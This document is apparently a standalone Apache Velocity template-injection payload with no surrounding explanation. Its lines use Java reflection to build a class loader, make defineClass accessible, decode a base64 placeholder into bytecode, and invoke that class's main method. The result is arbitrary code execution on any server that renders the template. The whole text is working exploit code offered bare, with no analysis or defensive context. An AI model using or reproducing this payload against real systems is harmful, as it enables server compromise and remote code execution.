#set($b="${[BASE64PAYLOAD]}")
#set($c=$b.getClass().getClass())
#set($a=$c.forName("java.util.ArrayList"))
#set($l=$a.newInstance())
#set($o=$c.forName("java.lang.Object"))
#set($q=$a.getMethod("add",$o).invoke($l,"x"))
#set($i=$c.forName("java.lang.Integer").getField("TYPE").get(null))
#set($n=$c.forName("java.lang.reflect.Array").getMethod("newInstance",$c,$i))
#set($l[0]=$n.invoke(null,$c.forName("java.net.URL"),0))
#set($r=$c.forName("java.net.URLClassLoader").getConstructor($c.forName("[Ljava.net.URL;")).newInstance($l.toArray()))
#set($m=$c.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", $c.forName("[B"),$i,$i))
#set($q=$m.setAccessible(true))
#set($l[0]=$c.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer($b))
#set($s=$c.forName("java.lang.reflect.Array").getMethod("getLength",$o).invoke(null,$l.toArray()))
#set($z=$m.invoke($r,$l[0],0,$s))
#set($l[0]=$n.invoke(null,$c.forName("java.lang.String"),0))
#set($q=$z.getMethod("main", $c.forName("[Ljava.lang.String;")).invoke(null,$l.toArray()))
